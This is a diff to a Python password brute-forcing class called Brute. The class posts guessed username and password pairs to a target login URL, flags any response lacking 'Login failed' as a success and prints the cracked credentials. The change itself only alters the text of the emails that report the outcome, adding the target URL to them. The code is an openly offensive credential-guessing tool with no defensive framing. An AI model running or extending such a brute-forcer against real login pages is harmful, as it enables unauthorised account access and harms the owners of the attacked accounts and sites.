@@ -23,11 +23,11 @@ class Brute:
                         data["password"]=password
                         response = requests.post(self.target_url, data=data)
                         if "Login failed" not in response.content:
-                            # my_Email = send_email.Email(self.email, self.email, "Found Password","[+] Got the password --> Username: "+username+" Password: "+password, self.password)
+                            # my_Email = send_email.Email(self.email, self.email, "Found Password","[+] Got the password --> Username: "+username+" Password: "+password+" URL: "+self.target_url, self.password)
                             # my_Email.address()
                             print("[+] Got the password --> Username:"+username+" Password:"+password)
                             exit()
-        my_Email = send_email.Email(self.email, self.email,"No password found",self.password)
+        my_Email = send_email.Email(self.email, self.email,"No password found","Unable to find password to "+self.target_url ,self.password)
         my_Email.address()
         print("[+] Reached end of line")
 
